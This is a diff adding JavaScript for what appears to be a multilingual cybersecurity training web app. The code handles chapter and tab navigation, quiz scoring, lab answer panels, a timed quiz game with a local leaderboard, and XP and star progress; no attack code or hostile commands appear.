+  document.documentElement.setAttribute('dir', Lc.dir);
+  document.getElementById('langBtn').textContent = Lc.langBtn;
+  document.getElementById('sbLabel').textContent = Lc.sbLabel;
+  document.getElementById('headerChName').textContent = Lc.names[state.cur]||'';
+
+  for (let i=0; i<TOTAL_CHAPTERS; i++) {
+    const $=id=>document.getElementById(id);
+    if($('chname-'+i))  $('chname-'+i).textContent  = Lc.names[i]||'';
+    if($('chtag-'+i))   $('chtag-'+i).textContent   = Lc.tags[i]||'';
+    if($('chtitle-'+i)) $('chtitle-'+i).textContent = Lc.names[i]||'';
+    if($('chdesc-'+i))  $('chdesc-'+i).textContent  = Lc.descs[i]||'';
+    if($('cheat-'+i))   $('cheat-'+i).innerHTML     = Lc.cheat[i]||'';
+
+    const learnEl = $('learn-'+i);
+    if (learnEl) learnEl.innerHTML = (Lc.learn[i]||'');
+
+    const tabsEl = $('tabs-'+i);
+    if (tabsEl) {
+      const tabs = Lc.tabs;
+      const keys = Lc.tabKeys;
+      const cur = state.tabs[i]||'learn';
+      tabsEl.innerHTML = tabs.map((t,ti)=>
+        `<button class="tab-btn${cur===keys[ti]?' active':''}" onclick="showTab(${i},'${keys[ti]}')">${t}</button>`
+      ).join('');
+    }
+
+    ['quiz','lab','game'].forEach(p => {
+      const el = $(p+'-'+i);
+      if(el){el.innerHTML='';delete el.dataset.rendered;}
+    });
+    state.quiz[i]=null;
+    state.game[i]={phase:'idle'};
+  }
+
+  const t = state.tabs[state.cur]||'learn';
+  if(t==='quiz') renderQuiz(state.cur);
+  if(t==='lab')  renderLab(state.cur);
+  if(t==='game') renderGame(state.cur);
+}
+
+// ===== NAV =====
+function showChapter(n) {
+  document.querySelectorAll('.chapter').forEach(c=>c.classList.remove('active'));
+  document.querySelectorAll('.ch-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('ch-'+n)?.classList.add('active');
+  document.getElementById('nav-'+n)?.classList.add('active');
+  state.cur=n;
+  document.getElementById('headerChName').textContent = L().names[n]||'';
+  document.getElementById('sidebar')?.classList.remove('open');
+  window.scrollTo(0,0);
+  activateTab(n, state.tabs[n]||'learn');
+}
+
+function toggleSidebar() { document.getElementById('sidebar')?.classList.toggle('open'); }
+
+function showTab(chId, tabName) { state.tabs[chId]=tabName; activateTab(chId, tabName); }
+
+function activateTab(chId, tabName) {
+  const ch = document.getElementById('ch-'+chId);
+  if (!ch) return;
+  ch.querySelectorAll('.tab-btn').forEach(btn => {
+    const m = btn.getAttribute('onclick').match(/'(\w+)'\)/);
+    btn.classList.toggle('active', m && m[1]===tabName);
+  });
+  ch.querySelectorAll('.tab-panel').forEach(p => {
+    p.classList.toggle('active', p.id===chId+'-'+tabName);
+  });
+  if(tabName==='quiz') renderQuiz(chId);
+  if(tabName==='lab')  renderLab(chId);
+  if(tabName==='game') renderGame(chId);
+}
+
+// ===== QUIZ =====
+function renderQuiz(chId) {
+  const el = document.getElementById('quiz-'+chId);
+  if(!el||el.dataset.rendered) return;
+  el.dataset.rendered='1';
+  if(!state.quiz[chId]) state.quiz[chId]={qi:0,ans:{},done:false,score:0};
+  const qs=getQ(chId); const Lc=L();
+  const pips = qs.map((_,i)=>`<div class="quiz-pip" id="qpip-${chId}-${i}"></div>`).join('');
+  const cards = qs.map((q,i)=>`
+    <div class="quiz-q-card" id="qcard-${chId}-${i}">
+      <div class="quiz-meta"><span id="qmeta-${chId}-${i}"></span></div>
+      <div class="quiz-q">${q.q}</div>
+      <div class="quiz-opts">
+        ${q.o.map((opt,oi)=>`
+          <button class="quiz-opt" id="qopt-${chId}-${i}-${oi}" onclick="quizPick(${chId},${i},${oi})">
+            <span class="opt-letter" id="qltr-${chId}-${i}-${oi}"></span>${opt}
+          </button>`).join('')}
+      </div>
+      <div class="quiz-exp" id="qexp-${chId}-${i}" style="display:none">
+        <strong id="qexplbl-${chId}-${i}"></strong> ${q.e||''}
+      </div>
+    </div>`).join('');
+  el.innerHTML=`
+    <div class="quiz-prog" id="qprog-${chId}">${pips}</div>
+    ${cards}
+    <div class="quiz-result" id="qres-${chId}">
+      <div class="result-emoji" id="qemoji-${chId}">🎉</div>
+      <div class="result-score" id="qscore-${chId}"></div>
+      <div class="result-label" id="qlabel-${chId}"></div>
+      <div class="result-stars" id="qstars-${chId}"></div>
+      <div style="display:flex;gap:8px;justify-content:center;margin-top:8px">
+        <button class="btn btn-ghost" id="qbtn-reset-${chId}" onclick="quizReset(${chId})"></button>
+        <button class="btn btn-primary" id="qbtn-lab-${chId}" onclick="showTab(${chId},'lab')"></button>
+      </div>
+    </div>
+    <div class="quiz-nav" id="qnav-${chId}">
+      <button class="btn btn-ghost" id="qprev-${chId}" onclick="quizNav(${chId},-1)"></button>
+      <button class="btn btn-primary" id="qnext-${chId}" onclick="quizNav(${chId},1)"></button>
+    </div>`;
+  refreshQuiz(chId);
+}
+
+function refreshQuiz(chId) {
+  const st=state.quiz[chId]; if(!st) return;
+  const qs=getQ(chId); const Lc=L();
+  qs.forEach((_,i)=>{
+    const card=document.getElementById(`qcard-${chId}-${i}`);
+    if(card) card.classList.toggle('active',i===st.qi);
+    const pip=document.getElementById(`qpip-${chId}-${i}`);
+    if(pip) pip.className='quiz-pip'+(i<st.qi||st.done?' done':i===st.qi?' cur':'');
+    const meta=document.getElementById(`qmeta-${chId}-${i}`);
+    if(meta) meta.textContent=`${Lc.question} ${i+1} ${Lc.of} ${qs.length}`;
+    qs[i].o.forEach((_,oi)=>{
+      const ltr=document.getElementById(`qltr-${chId}-${i}-${oi}`);
+      if(ltr) ltr.textContent=Lc.optLetters[oi];
+    });
+    const explbl=document.getElementById(`qexplbl-${chId}-${i}`);
+    if(explbl) explbl.textContent=Lc.quizExplain;
+  });
+  const prev=document.getElementById(`qprev-${chId}`);
+  const next=document.getElementById(`qnext-${chId}`);
+  if(document.getElementById(`qbtn-reset-${chId}`)) document.getElementById(`qbtn-reset-${chId}`).textContent=Lc.quizAgain;
+  if(document.getElementById(`qbtn-lab-${chId}`)) document.getElementById(`qbtn-lab-${chId}`).textContent=Lc.quizToLab;
+  if(prev){prev.textContent=Lc.quizPrev;prev.disabled=st.qi===0;}
+  if(next){
+    const ans=st.ans[st.qi]!==undefined;
+    if(st.qi<qs.length-1){next.textContent=Lc.quizNext;next.disabled=!ans;next.onclick=()=>quizNav(chId,1);}
+    else{next.textContent=Lc.quizSubmit;next.disabled=Object.keys(st.ans).length<qs.length;next.onclick=()=>quizSubmit(chId);}
+  }
+}
+
+function quizPick(chId,qi,oi){
+  const st=state.quiz[chId];if(!st||st.done)return;
+  st.ans[qi]=oi;
+  getQ(chId)[qi].o.forEach((_,o)=>{
+    const btn=document.getElementById(`qopt-${chId}-${qi}-${o}`);
+    if(btn) btn.classList.toggle('selected',o===oi);
+  });
+  refreshQuiz(chId);
+}
+
+function quizNav(chId,dir){
+  const st=state.quiz[chId];if(!st)return;
+  st.qi=Math.max(0,Math.min(getQ(chId).length-1,st.qi+dir));
+  refreshQuiz(chId);
+}
+
+function quizSubmit(chId){
+  const st=state.quiz[chId];if(!st)return;
+  const qs=getQ(chId);const Lc=L();
+  let score=0;
+  qs.forEach((q,i)=>{
+    const chosen=st.ans[i];const correct=q.a;
+    q.o.forEach((_,oi)=>{
+      const btn=document.getElementById(`qopt-${chId}-${i}-${oi}`);
+      if(!btn)return;
+      btn.classList.add('disabled');
+      if(oi===correct)btn.classList.add('correct');
+      else if(oi===chosen)btn.classList.add('wrong');
+      btn.classList.remove('selected');
+    });
+    const exp=document.getElementById(`qexp-${chId}-${i}`);
+    if(exp)exp.style.display='block';
+    if(chosen===correct)score++;
+  });
+  st.done=true;st.score=score;
+  const stars=score>=5?3:score>=4?2:score>=3?1:0;
+  state.stars[chId]=Math.max(state.stars[chId]||0,stars);
+  addXP(score*10);updateStars(chId);
+  document.getElementById(`qnav-${chId}`).style.display='none';
+  const res=document.getElementById(`qres-${chId}`);
+  res.classList.add('visible');
+  document.getElementById(`qscore-${chId}`).textContent=`${score}/${qs.length}`;
+  const emojis=['😔','😅','🙂','😊','🎉','🏆'];
+  document.getElementById(`qemoji-${chId}`).textContent=emojis[score]||'🎉';
+  document.getElementById(`qlabel-${chId}`).textContent=Lc.resultLabels[score]||'';
+  document.getElementById(`qstars-${chId}`).textContent='⭐'.repeat(stars)+'☆'.repeat(3-stars);
+  qs.forEach((_,i)=>{const c=document.getElementById(`qcard-${chId}-${i}`);if(c)c.classList.add('active');});
+}
+
+function quizReset(chId){
+  state.quiz[chId]=null;
+  const el=document.getElementById('quiz-'+chId);
+  if(el){el.innerHTML='';delete el.dataset.rendered;}
+  delete _sqCache[currentLang+'-'+chId];
+  renderQuiz(chId);
+}
+
+// ===== LAB =====
+function renderLab(chId){
+  const el=document.getElementById('lab-'+chId);
+  if(!el||el.dataset.rendered)return;
+  el.dataset.rendered='1';
+  const exs=getL(chId);const Lc=L();
+  el.innerHTML=exs.map((ex,i)=>`
+    <div class="lab-ex" id="labex-${chId}-${i}">
+      <div class="lab-ex-hdr" onclick="toggleLab(${chId},${i})">
+        <span class="lab-num">${i+1}</span>
+        <span class="lab-q">${ex.q}</span>
+        <span class="lab-chevron">▼</span>
+      </div>
+      <div class="lab-ans-wrap">
+        <div class="lab-ans-inner">
+          <div class="lab-ans-pre">${ex.a}</div>
+          <div class="lab-explain"><strong>${Lc.labExplain}</strong> ${ex.e||''}</div>
+        </div>
+      </div>
+    </div>`).join('');
+}
+
+function toggleLab(chId,i){
+  const el=document.getElementById(`labex-${chId}-${i}`);
+  if(el){el.classList.toggle('open');if(el.classList.contains('open'))addXP(5);}
+}
+
+// ===== GAME =====
+function renderGame(chId){
+  const el=document.getElementById('game-'+chId);
+  if(!el)return;
+  if(!state.game[chId])state.game[chId]={phase:'idle'};
+  const gs=state.game[chId];const Lc=L();
+  if(gs.phase==='idle'){
+    const gqs=getG(chId);
+    el.innerHTML=`
+      <div class="game-start-card">
+        <div class="game-icon">🛡️</div>
+        <div class="game-start-title">${Lc.gameTitle}</div>
+        <p class="game-start-desc">${Lc.gameDesc}</p>
+        <div class="game-rules">
+          <div class="game-rule">⏱️ <span>60</span> ${Lc.gameSeconds}</div>
+          <div class="game-rule">❓ <span>${gqs.length}</span> ${Lc.gameQuestions}</div>
+          <div class="game-rule">🏆 <span>${Lc.gameXP}</span></div>
+        </div>
+        <button class="btn btn-primary" style="font-size:13px;padding:11px 32px" onclick="gameStart(${chId})">${Lc.gameStart}</button>
+        ${buildLB(chId)}
+      </div>`;
+  } else if(gs.phase==='playing'){
+    renderGamePlay(chId);
+  } else {
+    renderGameOver(chId);
+  }
+}
+
+function gameStart(chId){
+  const gqs=getG(chId);
+  state.game[chId]={phase:'playing',qs:[...gqs].sort(()=>Math.random()-.5),qi:0,score:0,time:60,answered:false};
+  renderGame(chId);startTimer(chId);
+}
+
+function renderGamePlay(chId){
+  const el=document.getElementById('game-'+chId);
+  const gs=state.game[chId];const Lc=L();
+  if(!gs||gs.phase!=='playing')return;
+  const q=gs.qs[gs.qi];
+  if(!q){gameOver(chId);return;}
+  el.innerHTML=`
+    <div class="game-hud">
+      <div class="hud-timer${gs.time<=10?' urgent':''}" id="gtimer-${chId}">${gs.time}</div>
+      <div class="hud-qnum">${gs.qi+1}/${gs.qs.length}</div>
+      <div class="hud-score">⭐ ${gs.score}</div>
+    </div>
+    <div class="game-q">${q.q}</div>
+    <div class="game-opts">
+      ${q.o.map((opt,i)=>`<button class="game-opt" id="gopt-${chId}-${i}" onclick="gameAnswer(${chId},${i})">${opt}</button>`).join('')}
+    </div>
+    <div class="game-fb" id="gfb-${chId}"></div>`;
+}
+
+function startTimer(chId){
+  clearInterval(gameTimer);
+  gameTimer=setInterval(()=>{
+    const gs=state.game[chId];
+    if(!gs||gs.phase!=='playing'){clearInterval(gameTimer);return;}
+    gs.time--;
+    const t=document.getElementById(`gtimer-${chId}`);
+    if(t){t.textContent=gs.time;t.className='hud-timer'+(gs.time<=10?' urgent':'');}
+    if(gs.time<=0){clearInterval(gameTimer);gameOver(chId);}
+  },1000);
+}
+
+function gameAnswer(chId,chosen){
+  const gs=state.game[chId];if(!gs||gs.answered)return;
+  gs.answered=true;
+  const q=gs.qs[gs.qi];const ok=q.a===chosen;
+  document.querySelectorAll(`#game-${chId} .game-opt`).forEach(b=>b.classList.add('disabled'));
+  document.getElementById(`gopt-${chId}-${chosen}`)?.classList.add(ok?'correct':'wrong');
+  if(!ok)document.getElementById(`gopt-${chId}-${q.a}`)?.classList.add('correct');
+  const fb=document.getElementById(`gfb-${chId}`);
+  if(fb){fb.textContent=ok?'+10 ✓':'✗';fb.className='game-fb '+(ok?'ok':'bad');}
+  if(ok){gs.score+=10;addXP(10);}
+  setTimeout(()=>{
+    gs.qi++;gs.answered=false;
+    if(gs.qi>=gs.qs.length){gameOver(chId);return;}
+    renderGamePlay(chId);startTimer(chId);
+  },850);
+}
+
+function gameOver(chId){
+  clearInterval(gameTimer);
+  const gs=state.game[chId];if(!gs)return;
+  gs.phase='over';const Lc=L();
+  try{
+    let lb=JSON.parse(localStorage.getItem(`cyber-${chId}`)||'[]');
+    lb.push({name:Lc.playerName,score:gs.score,ts:Date.now()});
+    lb.sort((a,b)=>b.score-a.score);lb=lb.slice(0,5);
+    localStorage.setItem(`cyber-${chId}`,JSON.stringify(lb));
+  }catch(e){}
+  const total=gs.qs.length*10;const pct=Math.round((gs.score/total)*100);
+  const medal=gs.score>=total*.8?'🏆':gs.score>=total*.5?'🥈':'🥉';
+  document.getElementById('game-'+chId).innerHTML=`
+    <div class="game-over-card">
+      <div style="font-size:50px;margin-bottom:8px">${medal}</div>
+      <div class="game-over-score">${gs.score}</div>
+      <div class="game-over-title">${Lc.points} · ${pct}${Lc.pct}</div>
+      ${buildLB(chId)}
+      <div style="display:flex;gap:8px;justify-content:center;margin-top:16px">
+        <button class="btn btn-ghost" onclick="gameRestart(${chId})">${Lc.gameAgain}</button>
+        <button class="btn btn-primary" onclick="showTab(${chId},'cheat')">${Lc.gameToCheat}</button>
+      </div>
+    </div>`;
+}
+
+function gameRestart(chId){
+  state.game[chId]={phase:'idle'};
+  const el=document.getElementById('game-'+chId);
+  if(el)el.innerHTML='';
+  delete _sgCache[currentLang+'-g-'+chId];
+  renderGame(chId);
+}
+
+function buildLB(chId){
+  let lb=[];
+  try{lb=JSON.parse(localStorage.getItem(`cyber-${chId}`)||'[]');}catch(e){}
+  if(!lb.length)return'';
+  const medals=['🥇','🥈','🥉','4','5'];
+  const cls=['gold','silver','bronze','normal','normal'];
+  const Lc=L();
+  return`<div class="leaderboard"><div class="lb-title">${Lc.lbTitle}</div>${lb.map((e,i)=>`
+    <div class="lb-row ${cls[i]}">
+      <span class="lb-rank">${medals[i]}</span>
+      <span class="lb-name">${e.name||Lc.unknownPlayer}</span>
+      <span class="lb-pts">${e.score} ${Lc.points}</span>
+    </div>`).join('')}</div>`;
+}
+
+// ===== XP & STARS =====
+function addXP(n){
+  state.xp+=n;
+  const max=TOTAL_CHAPTERS*(5*10+4*5+8*10);
+  const pct=Math.min(100,(state.xp/max)*100);
+  document.getElementById('xpBar').style.width=pct+'%';
+  document.getElementById('xpLabel').textContent=state.xp+' XP';
+}
+
+function updateStars(chId){
+  const el=document.getElementById('stars-'+chId);
+  if(!el)return;
+  const s=state.stars[chId]||0;
+  el.textContent='⭐'.repeat(s)+'☆'.repeat(3-s);
+}
+</script></body></html>
